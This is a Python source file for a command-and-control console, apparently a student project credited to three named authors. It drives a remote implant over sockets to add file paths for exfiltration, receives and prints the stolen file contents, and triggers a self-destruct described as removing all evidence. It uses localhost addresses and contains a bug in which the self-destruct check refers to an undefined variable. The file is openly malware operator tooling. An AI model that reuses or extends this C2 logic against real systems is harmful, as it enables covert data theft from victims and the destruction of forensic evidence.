import colorama
from colorama import Fore, Back, Style
import socket
import sys
import rsa


#generate the rsa key used by C2
(pubkey, privkey) = rsa.newkeys(1024)

# Create a TCP/IP socket
c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the port
server_address = ('localhost', 9999)
c2_socket.bind(server_address)

colorama.init(autoreset=True)

print('########################################################')
print('##                                                    ##')
print('##           COMMAND AND CONTROL PROGRAM              ##')
print('##   Yefim Shneyderman, Anthony Rinaldi, Brendon Ky   ##')
print('##                                                    ##')
print('########################################################')

def recieve_exfil():
    # Wait for a connection
    print("Waiting for a Connection...")
    connection, client_address = c2_socket.accept()
    try:
        #Recieves and prints the data
        while True:
            #encrypted
            data = connection.recv(500)
            if data:
                content = data.decode("utf-8")
                lines = content.split("\n")
                for l in lines:
                    if(l != ""):
                        print(l)
            else:
                print("----------------")
                break
            
    finally:
        # Clean up the connection
        connection.close()

def send_implant(comm):
    #Send comm command to victim
    implant_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Connect the socket to the port where the server is listening
    implant_server_address = ('localhost', 10000)
    implant_socket.connect(implant_server_address)
    implant_socket.sendall(str.encode(comm))
    implant_socket.close()

while(True):
    print("Options:")
    print("1. Self-destruct (clears implant and removes all evidence)")
    print("2. Exfil data")
    print("3. Exit")
    print(f"{Fore.CYAN}What would you like to do:")
    choice = input(">>").lower()
    if choice == '1':
        print("Are you sure you want to self-destruct? This action cannot be undone. Enter 'y/n'")
        c1 = input(">>").lower()
        if(c1 == 'y'):
            print("Answer this puzzle to self-destruct: I am an odd number, but take away one letter and I am 'even'")
            c2 = input(">>").lower()
            if(c2 == '7' or c == 'seven'):
                print(f"{Fore.RED}Self-destruct initiated")
                send_implant('1')
                print(f"{Fore.RED}Self-destruct complete")
                exit()
            else:
                print("Incorrect. Aborting self-destruct")
        else:
            print("Aborting self-destruct")

    elif choice == '2':       
        #Listen for the Responses
        c2_socket.listen(1)
        while(True):
            print("Press 'n' to end, 'a' to add an exfil path, any other key to continue")
            c = input(">>").lower()
            if(c == 'n'):
                break
            elif(c == 'a'):
                print("Enter the absolute path to the file to add")
                path = input(">>")
                send_implant('2a' + ";" + path)
            else:
                print("Exfil initiated")
                #Send command to exfiltrate
                #encrypt command, send with public key
                send_implant('2e')
                #Recieve the exfil and decrypt the response
                recieve_exfil()
            
            
    elif choice == '3' or choice == 'q' or choice == 'exit' or choice == 'quit':
        print("Exiting the C2 instance")
        print("Implant is still running - Connect to it again later")
        exit()

    else:
        print("Unrecognized input")

        
    